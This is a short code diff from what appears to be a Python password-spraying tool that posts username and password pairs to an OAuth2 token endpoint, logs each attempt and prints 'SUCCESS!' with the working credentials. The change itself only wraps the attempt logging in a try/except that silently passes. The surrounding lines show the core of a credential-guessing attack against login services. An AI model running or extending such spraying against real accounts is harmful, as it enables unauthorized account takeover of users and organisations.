@@ -101,8 +101,11 @@ for username in usernames:
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
     time_posted = datetime.datetime.now()
-    log = f"{time_posted},{ip},{username},{password}\n"
-    logfile.write(log)
+    try:
+        log = f"{time_posted},{ip},{username},{password}\n"
+        logfile.write(log)
+    except:
+        pass
     if r.status_code == 200:
         print(f"SUCCESS! {username} : {password}")
         results += f"{username} : {password}\n"
